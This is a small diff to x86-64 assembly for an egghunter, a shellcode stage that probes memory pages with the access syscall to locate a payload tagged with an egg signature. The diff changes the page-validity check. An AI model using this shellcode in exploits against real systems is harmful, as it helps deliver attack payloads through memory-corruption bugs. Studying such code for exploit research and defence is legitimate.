@@ -46,8 +46,9 @@ nxt_addr:
     pop     rax       ; rax = sys_access 
     syscall
     pop     rdi       ; restore rdi
-    cmp     al, 0xF2  ; -EFAULT means bad address
-    je      nxt_page  ; eax is zero if page is ok 
+    ;cmp     al, 0xF2  ; -EFAULT means bad address
+    test    eax, eax    
+    jle     nxt_page  ; if eax is <= 0, go again
     
     ; put your own egg signature here
     mov     eax, 0xDEADC0DE
